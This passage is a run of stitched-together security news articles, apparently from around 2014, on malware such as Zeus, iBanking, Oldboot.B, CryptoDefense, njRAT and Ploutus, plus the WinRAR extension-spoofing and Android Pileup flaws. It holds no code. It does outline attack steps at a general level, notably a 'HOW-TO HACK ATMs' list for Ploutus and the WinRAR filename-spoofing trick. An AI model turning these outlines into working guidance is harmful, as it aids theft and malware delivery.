significant interest, and will continue for the years to come. It would be a $20 Trillion Market over the next several years, but Security and privacy are the key issues for such applications, and still face some enormous challenges." }

FREE! FREE! ZeuS BRINGS ROOTKIT UPDATE Recently, the security researcher, Kan Chen at Fortinet has found that P2P Zeus botnet is updating its bots/infected systems with updates version that has the capability to drop a rootkit into infected systems and hides the trojan to prevent the removal of malicious files and registry entries. The new variant also double check for the earlier installed version (0x38) of ZeuS trojan on the infected system and then replaces it with updated binary files (0X3B version). “Every P2P Zeus binary would extract the version number from the update packet and compare the version number that is hardcoded in its body” to verify the success of update process. According to researchers, there is only a minimal change in the new variant of P2P Zeus as the new binary also drops a rootkit driver file into the %SYSTEM32%\\drivers folder, apart from its original functions. New Zeus Trojan equipped with rootkit feature makes it more sophisticated and increases the difficulty of removing Zeus from infected systems. HOW TO PROTECT YOURSELF FROM ZeuS TROJAN We recommend users to use common sense and think twice before giving a click to any link on their e-mails or at any other websites they visit.

The Reddit Jailbreak community discovered the malicious infection dubbed as ‘Unflod Baby Panda’, on some jailbroken Apple iOS devices on Thursday while a user noticed an unusual activity that the file was causing apps such as Snapchat and Google Hangouts to crash constantly on his jailbroken iPhone. CHINA WANTS YOUR APPLE ID & PASSWORDS Soon after the jailbroken developer uncovered the mysteries ‘Unfold.dylib’ file and found that the infection targets jailbroken iOS handsets to captures Apple IDs and passwords from Internet sessions that use Secure Socket Layer (SSL) to encrypt communications and is believed to be spreading through the Chinese iOS software sites, according to the researchers at German security firm SektionEins. The researchers found that the captured login information is been sent to some server of the Internet Protocol (IP) address “23.88.10.4”, which is suspected to be controlled by the individuals in China, as the malware developer certificate is found digitally signed by the name Wang Xin. \"Currently the jailbreak community believes that deleting the Unfold.dylib binary and changing the apple-id's password afterwards is enough to recover from this attack. However it is still unknown how the dynamic library ends up on the device in the first place and therefore it is also unknown if it comes with additional malware gifts,\" the researchers wrote while inspecting the infection. \"We therefore believe that the only safe way of removal is a full restore, which means the removal and loss of the jailbreak,\" they added. Immediately after the thread at the Reddit jailbreak community was started, several developers in the community warned the users to not touch the software, which they suspected was a malware. While the researchers noted that the manual removal of the malware infection is possible. AFFECTED DEVICES The iPhone owners using iPhone 5 and any other 32-bit jailbroken iOS device handset might be affected, who are advised to change their Apple ID password after the removal of the malicious software using the steps mentioned below. However, the iPhone owners using latest 64-bit iOS devices such as iPhone 5S, iPad Air and iPad Mini Retina might not be affected by the malware.

The malicious iBanking app installed on victims’ phone has capabilities to spy on user’s communications. The bot allows an attacker to spoof SMS, redirect calls to any pre-defined phone number, capture audio using the device's microphone and steal other confidential data like call history log and the phone book contacts. According to new report from ESET security researchers, now this iBanking Trojan (Android/Spy.Agent.AF) is targeting Facebook users by tricking them to download a malware application. The malware uses JavaScript web injection method to create a fake Facebook Verification page for Facebook users, as shown: Injected fake verification page prompts users to enter their mobile number in order to verify the Facebook account authenticity, and then shows the following page if he indicates that his mobile is running Android. Next fake page asks victim to download an Android app from the shown URL or using QR code method, if SMS somehow fails to reach the user’s phone. Once downloaded and installed, the malware connects to its command-and-control server that allows attackers to issue commands to each infected device. Facebook also has two-factor authentication features for quite a long time, but this is the very first time when Facebook users are targeted by iBanking Trojan. The reason may be an increasing number of people using it. Since many banking sites use two-factor authentication and transaction authorization systems in order to deal with the various threats, but in order to bypass two factor authentication, cyber criminals have started to create various mobile malware like iBanking to solve their purpose. iBanking Trojan can be used in conjunction with any malware in order to inject code into a webpage and is generally used to redirect incoming SMS messages to bypass two-factor authentication. It is always important to treat third-party apps with a healthy dose of suspicion and skepticism as cybercriminals are always out there to hijack your every device. Don't just download any app from any source you happen to encounter and before installing a new app, just check out the reputation of both the app and the publisher. In order to prevent direct installations, go to your Android device’s Applications Settings menu and disable the “unknown sources” option for installing apps. Stay Safe!" }

The new story broke by the German press, Der Spiegel on Sunday revealing that the German Aerospace Centre (DLR - Deutsches Zentrum für Luft- und Raumfahrt e. V.), the country’s national center for aerospace, energy and transportation research located in Cologne has been reportedly targeted in a cyber attack out “coordinated and systematic”, apparently launched by a foreign intelligence agency. The systems used by administrators and scientists of the space research center have been found to be infected with Malware and spyware software, and as mention in the report, the attack was “co-ordinated and systematic” with the perfection of Trojan used. SELF-DESTRUCTING MALWARE, WITH LOVE FROM CHINA The espionage attack appears to be so complex that even the forensic investigators who have analyzed the infections unable to detect the actual malware, as some Trojans used were designed to self-destruct as soon as they discovered, while other malware remain mum for several months before being activated. The report says all operating systems that are in use at German Aerospace Center (DLR) are affected by the cyber attacks. Yet, it is not at all clear that who is behind the cyber attacks. But, the evidence points towards China, as IT forensic experts of the Federal Office for Security in Information Technology (BSI) discovered “Chinese characters” in the malicious code of some Trojan and “recurring typos” suggest an attacker from the Far East. Though, it could also be a “simple camouflage”, an insider told Der Spiegel. As the U.S. intelligence agency NSA can’t be completely ruled out, he added. But China would appear more likely on the first glance, rather than United States, because they are already at foremost position in space exploration. The federal government categorizes the attack as extremely serious because among other things, the center gathers and reserves information on armament and rocket technologies as well." }

In the world of Smart devices where our Smartphones knows more than we know ourselves. To keep our device protected from harmful viruses, malware or spyware, we totally depend on various security products such as antivirus, firewall and privacy guard apps, that we typically install from some trusted sources, Google Play Store. Most Antivirus apps are available to download for free, but some of them are paid with extra premium features like advance firewall protection, anti theft, App Locker or Cloud Backup etc. But do you believe that just because you're downloading an application from an official app store and also if its a premium paid version, you're safe from malicious software? Think twice. PAID, BUT FAKE ANTIVIRUS APP In Past, Mobile Security Researchers had spotted numerous fake mobile antivirus scanners that were available for free download at Google's Play marketplace, but its the first time when a cyber criminals are offering a fake, but paid Antivirus Solution called ‘Virus Shield’ for your Android device at Google’s play store. Virus Shield masquerade itself as an antivirus that claims to \"protect you and your personal information from harmful viruses, malware, and spyware\" and also \"Improve the speed of your phone,\" which it does with just a click. Moreover, it claims to have least effect on battery, run in the background, and in addition it also acts as adblock software that will stop those \"pesky advertisements,\" which we deal every day. MORE THAN $40,000 FRAUD AT GOOGLE PLAY STORE Virus Shield antivirus app costs $3.99, and has been on the Google Play Store for just over a week and has already been successfully downloaded more than 10,000 times by Smartphones users with a 4.7 star review from 1,700 people, that means total amount received by developer is more than $40,000. Even 2,607 users had hit the Google \"recommend\" button, which means that the antivirus app must be doing great to users who look for trusted and efficient antivirus app to secure their devices. WHAT A SCANNER - VIRUS SHIELD Surely it doesn't scan or detect anything. Android Police has discovered that the app only changes a red \"X\" graphic to a red \"check\" graphic, that’s it, nothing less or more. The virus shield antivirus app is a total scam and it doesn't scan or secure your device, which means thousands of users have been scammed out of their money. When the creator (email : Jesse_Carter@live.com) tracked down by the investigators, it revealed that the creator was a well known scammer who was also accused and banned from forums for trying to scam people out of various low-valued online game items. You can check out the code for yourself from here, as the android police have decompiled the app and mirrored the java code on GitHub. HOW TO PROTECT YOURSELF There is no such way to protect you from these kinds of fraudsters. All you can do is report the Virus Shield via the Play Store app by listing the app’s \"flag as inappropriate,\" then tap \"other objection\" and write about the app’s fraud to users. Alternatively, you can report it on the web. Users are advised to only download applications from known and trusted publishers." }

Every Windows PC in the world is set to accept software \"signed\" with Microsoft's digital certificates of authenticity, an extremely sensitive cryptography seal. Cyber Criminals somehow managed to hack valid Microsoft digital certificate, used it to trick users and admins into trusting the file. Since the executable is digitally signed by the Microsoft developer no antivirus tool could find it as malicious. Digitally signed malware received a lot of media attention last year. Reportedly, more than 200,000 unique malware binaries were discovered in past two years signed with valid digital signatures. A Comodo User submitted a sample of the malicious software that attempts to trick user by masquerading itself as file of Internet Explorer and having a valid signature issued to “isonet ag”.

The Comodo Team found over 200 unique hits for new variant of this Zeus distributed over mass computers via infected web pages or phishing mail attacks. JUST BEHIND YOUR WEB BROWSER Typically, Zeus malware triggers a Man-In-Browser (MitB) attack and allows the hacker to establish a remote session in order to intercept the actions performed by the victim. \"If the attack victim goes to an online banking site to perform a transaction, such as transferring funds, they see everything as occurring normally. The payment information they keyed will display as expected, but behind the scenes the hackers will alter the transaction and send it to another account with possibly a larger amount.\" researchers explained. There are three components of Zeus to launch an attack: Downloader: Once the malware will get installed via online vulnerability or as an attachment in a phishing email, it will download the rootkit and malware component of the attack. Malware: It is a stealer that will steal valuable user data, login credentials, credit card info, etc. Rootkit: This component will hide the installed malware via protecting it from detection and removal. The rootkit is installed by decrypting the downloaded file into the “Boot Bus Extender” so that it gets loads prior to any driver and this makes it hard to remove as well. To protect malicious components and auto-run entries from being deleted by antivirus software 'After decrypting downloaded payload, the rootkit is installed within “Boot Bus Extender” to make sure it loads before other drivers.' researchers explained. HOW TO KICK ZEUS ASS We have noticed an increase in this trend of signed malware.

Oldboot is a piece of Android malware that's designed to re-infect Mobile devices even after a thorough cleanup. It resides in the memory of infected devices; It modify the devices’ boot partition and booting script file to launch system service and extract malicious application during the early stage of system’s booting. Yet another alarming report about Oldboot malware has been released by the Chinese Security Researchers from '360 Mobile Security'. They have discovered a new variant of the Oldboot family, dubbed as 'Oldboot.B', designed exactly as Oldboot.A, but new variant has advance stealth techniques. Especially, the defense against with antivirus software, malware analyzer, and automatic analysis tools. \"The Oldboot Trojan family is the most significant demonstration of this trend.\" researchers said. Oldboot.B, Android Bootkit malware has following abilities: It can install malicious apps silently in the background. It can inject malicious modules into system process. Prevent malware apps from uninstalling. Oldboot.B can modify the browser's homepage. It has ability to uninstall or disable installed Mobile Antivirus softwares. INFECTION & INSTALLING MORE MALWARE APPS Once an Android device is infected by Oldboot.B trojan, it will listen to the socket continuously and receive and execute commands received from the attacker's command-and-control server. Malware has some hidden ELF binaries, that includes steganographically encrypted strings, executable codes and configuration file downloaded from C&C server, located at az.o65.org (IP is 61.160.248.67). After installation, Oldboot Trojan install lots of other malicious android applications or games in the infected device, which are not manually installed by the user. MALWARE ARCHITECTURE Oldboot.B architecture includes four major Components, those automatically executes during the system startup by registering itself as a service in the init.rc script: 1) boot_tst - uses remote injection technique to inject an SO file and a JAR file to the 'system_server' process of the Android system, continuously listen to the socket, and execute commands sent. 2) adb_server - replaces pm script of Android system with itself and used for anti-uninstallation functionality. 3) meta_chk - update the configuration file, download and install Android Apps promoted in the background. The Configuration file is encrypted, that greatly increases the time required to analyze. To evade detection, meta_chk destroys itself from the file system, and left with only the injected process. Android Antivirus software does not support the process memory scan in the Android platform, so they cannot detect or delete the Oldboot Trojan which resides in the memory. 4) agentsysline - module written in C++ programming language, run as a daemon in the background to receive commands from command-and-control server. This component can uninstall anti-virus software, delete the specific files and enable or disable network connection etc. PROBLEMS FOR SECURITY RESEARCHERS To increase the problem of malware analyzers: It add some meaningless code and trigger some behavior randomly. Check for SIM card availability in the device, and it will not perform certain behavior if there is no SIM card to fool sandbox or emulators. Check for the existence of antivirus software, and may uninstall the anti-virus software before doing anything malicious. Malware uses the steganography techniques to hide its configuration file into images: \"But after some analysis, we found that the configuration of meta_chk is hidden in this picture, which contains the command will be executed by meta_chk and other information.\" researchers said. The size of this configuration file is 12,508 bytes. \"Depending on the commands sent from the C&C server, it can do many different things, such as sending fake SMS messages or phishing attacks, and so on. Driven by profit, the Oldboot Trojan family changes very fast to react to any situation.\" Oldboot.B is one of the most advanced Android malware that is very difficult to remove, but antivirus firm 360 Mobile Security also released Oldboot detection and removing tool for free, you can download it from their website. To avoid infection, Smartphones users should only install apps from trusted stores; make sure the Android system setting 'Unknown sources' is unchecked to prevent dropped or drive-by-download app installs; don't use untrusted custom ROMs and install a mobile security app." }

Simply by exploiting the flaws in it, that means they took advantage of the error in the developers’ code. Now, this time the hackers itself has left behind a crucial flaw in its malware code which can be exploited by us to help save our computer systems. Believe me, it’s not an April Fools’ joke! A malicious software program that holds the victims’ computer files hostage by wrapping them with strong encryption until the victim pays a ransom fee to get them decrypted, has a critical flaw in its malware code itself that it leaves the decryption key on the victim’s computer. The Anti-virus firm Symantec examined a sophisticated malware program dubbed as CryptoDefense (Trojan.Cryptodefense) ransomware, which appeared in the end of the last month. CryptoDefense is one of the complex malware programs that include a number of effective techniques, including Tor anonymity tool usage and Bitcoin digital currency to extort money from victims. CryptoDefense uses Microsoft’s infrastructure and Windows API to generate the encryption and decryption keys, the antivirus firm wrote on its blog. CryptoDefense encrypts files using public-key cryptography, a strong RSA 2048 encryption in order to ensure files are held to ransom and transmits the private key in plain text back to the attacker’s server, so that as soon as the ransom amount is paid by the victim, the attacker will release the private keys to decrypt the files.So, if once the files have been encrypted, without access to the private key, victims will not be able to decrypt the files. But here they stumbled, the CryptoDefense’ developer failed to realize that the private key is also left concealed on the user’s computer in a file folder with application data. “Due to the attacker’s poor implementation of the cryptographic functionality they have, quite literally, left their hostages a key to escape,” Symantec wrote. Despite the dumb mistake of the malware developer, it is not sure that it will left the users untouched, because some technical skills is required to figure out the decryption keys.CryptoDefense is been sent out as spam emails, or masquerade itself as a PDF file and once installed in the system, it attempts to communicate with either of the four domains and uploads a profile of the infected machine, the firm wrote. The Cyber Criminals demand either $500 or €500 that has to be paid within four days and if victim doesn't pay the ransom in the given time frame, the ransom doubles itself. According to the firm, it is estimated that the cybercriminals received more than $34,000 worth of Bitcoin in just a month, which shows the effectiveness of their scam. Symantec said it has blocked 11,000 unique CryptoDefense ransomware infections in more than 100 countries, with the majority of the infection attempts are noticed in the U.S. followed by the U.K., Canada, Australia, Japan, India, Italy and the Netherlands." }

WinRAR, a widely used file archiver and data compression utility helps hackers to distribute malicious code. Israeli security researcher Danor Cohen (An7i) discovered the WinRAR file extension spoofing vulnerability. WinRAR file extension spoofing vulnerability allows hackers to modify the filename and extension inside the traditional file archive, that helps them to hide binary malicious code inside an archive, pretending itself as '.jpg' , '.txt' or any other format. Using a Hex editor tool, he analysed a ZIP file and noticed that winrar tool also adds some custom properties to an archive, including two names - First name is the original filename (FAX.png) and second name is the filename (FAX.png) that will appear at the WINRAR GUI window. Danor manipulated the second filename and extension to prepare a special ZIP archive, that actually include a malware file \"FAX.exe\", but displaying itself as \"FAX.png\" to the user. Cyber intelligence company, IntelCrawler also published a report, which revealed that cybercriminals specialized in cyber espionage attacks are using this zero-day vulnerability in the wild to target several aerospace corporations, military subcontractors, embassies, as well as Fortune Global 500 companies. Using this technique, an attacker can drop any malware in very convincing manner to the victim's system. \"Using this method the bad actors bypass some specific security measures including e-mail server’s antivirus systems\" IntelCrawler said. Danor successfully exploited winrar version 4.20, and IntelCrawler confirmed that the vulnerability also works on all WinRar versions including v.5.1. HOW TO CREATE EXPLOITABLE ZIP FILE? A video demonstration has been prepared by Indian Security Researcher Ajin Abraham, shown below: \"One of the chosen tactics includes malicious fake CV distribution and FOUO (For Official Use Only)-like documents, including fax scanned messages\" Using social engineering techniques, attacker are targeting high profile victims with spear phishing mails, \"Most of sent malicious attachments are hidden as graphical files, but password protected in order to avoid antivirus or IDS/IPS detection.\" IntelCrawler reported. In above example, the Malware archive file was password protected to avoid antivirus detection, used in an ongoing targeted cyber espionage campaign. Researchers found Zeus-like Trojan as an attachment, which has ability to establish remote administration channel with the infected victim, gather passwords and system information, then send the collected and stolen data to the Command & Control server hosted in Turkey (IP 185.9.159.211, Salay Telekomünikasyon). Users are advised to use an alternative archiving software and avoid opening archives with passwords even if it has legitimate files. Update: Baidu Antivirus is now able to detect (identified as Exploit.WinRar.spoof.gen) hidden files generated with WinRAR File Extension Spoofing vulnerability. In a recent updated, Baidu Antivirus added Winrar related threat to their malware signature database. Security experts suggest users to immediately upgrade to WinRAR version 5.0 or higher to avoid this vulnerability." }

Now, once again the MiniDuke virus is spreading in wild via an innocent looking but fake PDF documents related to Ukraine, while the researcher at F-Secure were browsing the set of extracted decoy documents from a large batch of potential MiniDuke Samples. \"This is interesting considering the current crisis in the area,\" Mikko Hypponen, the CTO of security research firm F-Secure, wrote on Tuesday. The Hacker News reported a year ago about the malicious malware that uses an exploit (CVE-2013-0640) of the famous and actively used Adobe Reader. MiniDuke malware written in assembly language with its tiny file size (20KB), and uses hijacked Twitter accounts for Command & Control and incase twitter accounts are not active, the malware located backup control channels via Google searches. The malware consists of three components: PDF file, MiniDuke Main and Payload. Payload is dropped after the Adobe process gets exploited by opening the malicious PDF file, which refers to the topics including human rights, Ukraine's foreign policy, and NATO membership plans. The infected machine then use Twitter or Google to collect encrypted instructions showing them where to report for new backdoors and as soon as infected system connects the command servers, it starts receiving encrypted backdoors through GIF image files. Once installed, it may copy, remove, delete files, create database, stop the processes and download the new ones, that may also open backdoor access to other Trojans. F-Secure also provided screenshots of several Ukraine-related documents that were more likely twisted from already existing and real public documents. F-Secure found a bogus document signed by Ruslan Demchenko, the First Deputy Minister for Foreign Affairs of Ukraine. “The letter is addressed to the heads of foreign diplomatic institutions in Ukraine.” When the researcher translated the document, it comes out to be a note regarding “the 100th year anniversary of the 1st World War.” This also signalized that the attackers have somehow access to the Ukrainian Ministry of Foreign Affairs. “We don't know where the attacker got this decoy file from,” Hypponen wrote. “We don't know who was targeted by these attacks. We don't know who's behind these attacks. What we do know is that all these attacks used the CVE-2013-0640 vulnerability and dropped the same backdoor (compilation date 2013-02-21).” The authors of MiniDuke made the malware familiar with the work principles of antivirus software which makes it different from the other viruses. The malware turns unique for each system and contains a backdoor that allows it to avoid system analytics instruments, and in case the virus is detected, the backdoor stops malicious effects and makes it disappear for the system. MiniDuke Malware previously attacked government entities in Belgium, Brazil, Bulgaria, Czech Republic, Georgia, Germany, Hungary, Ireland, Israel, Japan, Latvia, Lebanon, Lithuania, Montenegro, Portugal, Romania, Russian Federation, Slovenia, Spain, Turkey, United Kingdom, United States, including Ukraine." }

The researchers analyzed 721 samples of malicious code ‘njRAT’ and revealed that a large number of about 24,000 infected computers worldwide were targeted by the malware infections with 542 control-and-command (C&C) server domain names. njRAT is not a new piece of malware in the market, it is available since June 2013. Till now its three variants have been released and all of which can be propagated through infected USB keys or networked drives. njRAT is a Remote Access Trojan (RAT) intensive in its data-stealing capabilities. In addition to log keystrokes, the malware is capable to access the victim's camera, steal credentials stored in browsers, upload and download files, perform process and file manipulations, view the victim's desktop. This RAT can be used to control networks of computers called Botnets, with the caliber to let the attacker update, uninstall, disconnect, restart, close the RAT and rename its campaign ID and an attacker has capabilities to create and configure the malware to spread through USB drives with the help of the Command & Control server software. HOW TO USE njRAT It is estimated that the popularity of the njRAT malware in the Middle East and North Africa is because of a large number of online community providing support in the form of instructions and tutorials for development of the malware. \"Technical support and tutorials on using njRAT are widely available on the Web. Symantec has found numerous video tutorials in the Arabic language containing step-by-step processes for downloading and setting up the malware, including steps such as dynamic DNS naming for C&C servers. This level of support enables attackers in the region to easily to build tools and server components for njRAT.\" researchers said. FATHER OF njRAT“The malware’s author also appears to hail from the region. njRAT appears to have been written by a Kuwait-based individual who uses the Twitter handle @njq8. The account has been used to provide updates on when new versions of the malware are available to download.” they added. Symantec has also spotted 487 groups of cyber criminals setting-up attacks using njRAT and these “attacks appear to have different motivations, which can be broadly classed as hacktivism, information theft, and botnet building.” “One such group is the S.K.Y.P.E/Tagged group, which has C&C servers hosted in Egypt and Algeria. The group’s vector for infection is a screensaver hosted on the file sharing site ge.tt. When victims download the compressed .rar file containing the screensaver, they get an executable containing njRAT.” Symantec said that nearly 80 percent of the command and control servers worldwide were located in the Middle East region and North Africa, such as Saudi Arabia, Iraq, Tunisia, Egypt, Morocco, Algeria, Palestine and Libya." }

As we know, coin mining is the key component for digital currencies, so the malware uses a botnet of infected Android Smartphones to mine for currency. Such malware does not steal data. Instead, they are capable of mining Bitcoin, Litecoin and Dogecoin using the victim's device. \"Mining can be incredibly resource-intensive and, if allowed to run without any limits, could potentially damage hardware by causing it to overheat and even burn out.\" researchers said. The Antivirus firm Trend Micro also spotted two apps named - 'Songs' and 'Prized - Real Rewards and Prizes' on Google plat store, infecting users with ANDROIDOS_KAGECOIN.HBT Dogecoin mining malware and already having more than one million installs. Both malicious apps are available as free downloads for devices running Android 2.2 or later, but they were not created by the same developer. According to researchers, these malware apps will only mine when the infected device is charging. The Smartphone's hardware is not powerful enough to mine crypto-currencies. It's not exactly a get-rich-quick scheme, so the hackers are targeting low digital currencies like Dogecoin or Litecoin i.e. easy-to-mine. \"Users with phones and tablets that are suddenly charging slowly, running hot, or quickly running out of batteries may want to consider if they have been exposed to this or similar threats,\" antivirus firm suggested. Make sure you have unchecked app installation from ‘Unknown sources’ to prevent dropped or drive-by-download malicious app installs." }

The Malaysian Prime Minister had also confirmed that the Malaysia Airlines plane had crashed in a remote part of the southern Indian Ocean. Cyber Criminals are known to take advantage of major news stories or events where there is a high level of public interest and now Scammers are also targeting tragedy of MH370 to trap innocent Internet users. Just a few days before we warned you about a Facebook malware campaign claimed that the missing Malaysian Airlines 'MH370 has been spotted in the Bermuda Triangle' with its passengers still alive and invites users to click a link to view breaking news video footage. This week, Security researchers at FireEye have revealed about various ongoing spear phishing and malware attacks by some advanced persistent threat (APT) attackers. According to the researchers, the Chinese hacking group called 'admin@338', specialized in cyber espionage attacks had sent multiple MH370-themed spear phishing emails to the government officials in Asia-Pacific, with an attachment referring to the missing Malaysian flight MH370. The attachment file was actually merged with Poison Ivy RAT (remote access tool) and WinHTTPHelper malware to hijack the computer systems of government officials. The Chinese Hacking Group also initiated another attack against the US based think tank on 14th March. A malicious attachment was dropped via spear phishing mails, contains “Malaysian Airlines MH370 5m Video.exe”. The malicious attachment pretended to be a Flash video related to the missing plane and attached a 'Flash' icon to the executable file. \"In addition to the above activity attributed to the Admin@338 group, a number of other malicious documents abusing the missing Flight 370 story were also seen in the wild.\" researchers said.

To encounter malware, phishing, and other online threats, Facebook has taken an important step forward. Facebook has unveiled its latest security-focused platform, dubbed as ‘ThreatData’, which is a framework that aims to standardize its methods for collecting and analyzing data. The ThreatData framework is implemented to import information about the various online threats, malware, phishing and other internet risks, then storing it proficiently for real-time and long-term analysis as well. It consists of three high level components i.e. Feeds, Data storage, and Real-time response. FEEDS: Feeds will collect data from a distinct source and implement them via a lightweight interface. “Here are some examples of feeds we have implemented: Malware file hashes from VirusTotal; Malicious URLs from multiple open source blogs and malware tracking sites; Vendor-generated threat intelligence we purchase; Facebook's internal sources of threat intelligence; and Browser extensions for importing data as a Facebook security team member reads an article, blog, or other content,” detailed in a blog post on Tuesday. DATA STORAGE: The data received by various Information Security firms and vendors are in different format, so the framework brought it in a common and simple format, which they call a ThreatDatum. ThreatDatums are then routed for short-term and long-term analysis through its two existing data repository systems, Hive and Scuba. Hive storage is used to answer questions based on long-term data: Have we ever seen this threat before? What type of threat is more prevalent from our perspective: malware or phishing? Scuba gives us the opposite end of the analysis spectrum: What new malware are we seeing today? Where are most of the new phishing sites? REAL-TIME RESPONSE: After storing the data, a processor is built to easily and quickly address all the threats, such as: All malicious URLs collected from any feed are sent to the same blacklist in order to protect the Facebook users. Interesting malware file hashes are automatically downloaded from known malware repositories, stored, and sent for automated analysis. Threat data are propagated to our homegrown security event management system, which is used to protect Facebook's corporate networks. “In a typical corporate environment, a single anti-virus product is deployed to all devices and used as a core defense. In reality, however, no single anti-virus product will detect all threats. Some vendors are great at detecting certain types of malware, while others can detect a wide array of threats but are more likely to mislabel them. We decided we would employ our framework to construct a light-weight set of hashes expressly not detected by our chosen anti-virus product and feed those hashes directly into our custom security event management system. The results have been impressive: we've detected both adware and malware installed on visiting vendor computers that no single anti-virus product could have found for us.” Faceook explained. THREATDATA IN ACTION: In 2013, Facebook team investigated a spam campaign, that was using fake Facebook accounts to spread links to malware designed for feature phones and capable of stealing a victim’s address book, sending premium SMS spam, and using the phone’s camera to take pictures. They analyzed the malware using ThreatData, located the origin of the malware and disrupt the spam campaign to shut down the botnet’s infrastructure. Also, the image above shows a graph Facebook developed using ThreatData to map malicious and victimized IP addresses, with the pie chart breaking that data down by ISP in the United States. For now the framework is just for Facebook's internal use." }

GameOver Zeus Trojan makes fraudulent transactions from your bank once installed in your system with the capability to conduct Distributed Denial of Service, or DDoS, attack using a botnet, which involves multiple computers flooding the financial institution’s server with traffic in an effort to deny legitimate users access to the site. TAREGET - EMPLOYMENT WEBSITES Now, a new variant of GameOver Zeus Trojan has been spotted, targeting users of popular employment websites with social engineering attacks, implemented to fetch additional private information about the victims, that could be used for bypassing multi-factor authentication mechanisms on other websites or services. The new variant has the capabilities to use complex web injections and perform Man-In-The-Browser (MITB) attack, which means it has caliber to infect a web browser to modify web pages, modify web contents or can insert addition contents, all in a completely covert fashion invisible to both the user and web host, even when other authentication factor solutions are in use. Initially the new variant of the GameOver Zeus Trojan targeted ‘CareerBuilder.com’, which is the largest employment website in the US, but now the researchers at F-Secure came across the same variant targeting one of the world largest employment website, ‘Monster.com’. MONSTER vs ZEUS The victims are served with the fake login page which looks similar to the same legitimate page (hiring.monster.com) of the website. Once the victim login, they are directed to the web page injected by the malware. The web page serves 18 different security questions to choose from, that are nothing but all the common security questions which the various websites ask; from mailing websites to financial ones. The list of which are given below: • In what City / Town does your nearest sibling live? • In what City / Town was your first job? • In what city did you meet your spouse/significant other? • In what city or town did your mother and father meet? • What are the last 5 digits / letters of your driver\\'s license number? • What is the first name of the boy or girl that you first dated? • What is the first name of your first supervisor? • What is the name of the first school you attended? • What is the name of the school that you attended aged 14-16? • What is the name of the street that you grew up on? • What is the name of your favorite childhood friend? • What is the street number of the first house you remember living in? • What is your oldest sibling\\'s birthday month and year?

(e.g January 2) • What was the city where you were married? • What was the first musical concert that you attended? • What was your favorite activity in school? The researchers warned the HR Recruiters with the website accounts to be on the lookout for any such irregularities. “If the account is potentially tied to a bank account and a spending budget … it's a target for banking Trojans,” said the researchers. Also in 2012, the FBI warned us about the ‘GameOver’ banking Trojan, but attackers are now bypassing every traditional security measures making Zeus more sophisticated piece of malware and putting Zeus to use it against various popular and big targets." }

MORE REASONS TO UPGRADESecurity researchers at Antivirus firm Symantec claimed that hackers can exploit a weakness in Windows XP based ATMs, that allow them to withdraw cash simply by sending an SMS to compromised ATMs. \"What was interesting about this variant of Ploutus was that it allowed cybercriminals to simply send an SMS to the compromised ATM, then walk up and collect the dispensed cash. It may seem incredible, but this technique is being used in a number of places across the world at this time.\" researchers said. HARDWIRED Malware for ATMsAccording to researchers - In 2013, they detected a malware named Backdoor.Ploutus, installed on ATMs in Mexico, which is designed to rob a certain type of standalone ATM with just the text messages. To install the malware into ATMs machines, hacker must connect the ATM to a mobile phone via USB tethering and then to initiate a shared Internet connection, which then can be used to send specific SMS commands to the phone attached or hardwired inside the ATM.\"Since the phone is connected to the ATM through the USB port, the phone also draws power from the connection, which charges the phone battery. As a result, the phone will remain powered up indefinitely.\" HOW-TO HACK ATMs Connect a mobile phone to the machine with a USB cable and install Ploutus Malware. The attacker sends two SMS messages to the mobile phone inside the ATM. SMS 1 contains a valid activation ID to activate the malware SMS 2 contains a valid dispense command to get the money out Mobile attached inside the ATM detects valid incoming SMS messages and forwards them to the ATM as a TCP or UDP packet. Network packet monitor (NPM) module coded in the malware receives the TCP/UDP packet and if it contains a valid command, it will execute Ploutus Amount for Cash withdrawal is pre-configured inside the malware Finally, the hacker can collect cash from the hacked ATM machine. Researchers have detected few more advanced variants of this malware, some attempts to steal customer card and PIN data, while others attempt man-in-the-middle attacks.

This time the vulnerabilities occur in the way Android handle the updates to add new flavors to your device. Researchers from Indiana University and Microsoft have discovered [Paper PDF] a new set of Android vulnerabilities that is capable to carry out privilege escalation attacks because of the weakness in its Package Management Service (PMS) that puts more than one billion Android devices at risk. The researchers dubbed the new set of security-critical vulnerabilities as Pileup ﬂaws which is a short for privilege escalation through updating, that waylays inside the Android PMS and intensifies the permissions offered to malicious apps whenever an android update occurs, without informing users. The research was carried out by Indiana University Bloomington researchers, Luyi Xing, Xiaorui Pan, Kan Yuan and XiaoFeng Wang, with the help of Rui Wang of Microsoft. Six different Pileup vulnerabilities have been found by the researchers within the Android PMS, those are present in all Android Open Source Project versions, including more than 3,500 customized versions of Android developed by handset makers and carriers. \"Every few months, an update is released, which causes replacement and addition of tens of thousands of files on a live system. Each of the new apps being installed needs to be carefully configured to set its attributes within its own sandboxes and its privileges in the system, without accidentally damaging existing apps and the user data they keep,\" the researchers wrote. \"This complicates the program logic for installing such mobile updates, making it susceptible to security-critical flaws.\" The researchers also found that by exploiting the Pileup vulnerabilities, a hacker can not only control the system permission and signature but also their settings. Moreover an attacker could use the malicious app to access and steal the device data, including, sensitive user information such as activity logs, user credentials, Contacts, Messages etc. “A distinctive and interesting feature of such an attack is that it is not aimed at a vulnerability in the current system. Instead, it exploits the ﬂaws in the updating mechanism of the “future” OS, which the current system will be upgraded to,” the researchers wrote. “More specifically, though the app running on a lower version Android, the adversary can strategically claim a set of carefully selected privileges or attributes only available on the higher OS version.” In short, it means that, if an attacker sends the malicious app update and if the permission don’t exist in the older version of the android that is added to the new version; the malicious app will silently acquire the permissions and when the device is upgraded to the newer version, the pileup flaws will be automatically exploited. \"A third-party package attribute or property, which bears the name of its system counterpart, can be elevated to a system one during the updating shuffle-up where all apps are installed or reinstalled, and all system configurations are reset,\" the researcher wrote. \"Also, when two apps from old and new systems are merged as described above, security risks can also be brought in when the one on the original system turns out to be malicious.\" During the update, first the PMS will install all new and existing system apps and then will proceed to install third party apps from the old OS and during the installation of malicious app packed inside PMS, the device will recognize and silently grants all the permissions that malicious app requests, as it supposes that these permissions are with an existing app and have already been approved by the user. “With the help of a program analyzer, our research discovered 6 such Pileup flaws within Android Package Manager Service and further confirmed their presence in all AOSP (Android Open Source Project) versions and all 3,522 source code versions customized by Samsung, LG and HTC across the world that we inspected, which strongly indicates their existence in all Android devices in the market.” Moreover detecting the critical flaws, the researchers have developed a new scanner app called SecUP that search for malicious apps already on a device designed to exploit Pileup vulnerabilities. Scanning tool inspects already installed Android application packages (APKs) on the device, in an attempt to identify those that will cause privilege escalations during an update, the paper stated. The SecUP scanning tool consists of an automated vulnerability detector, a program veriﬁcation tool for Java that discovers the Pileup ﬂaws within the source code of different Android versions and a threat analyzer that automatically scans thousands of OS images. “The detector 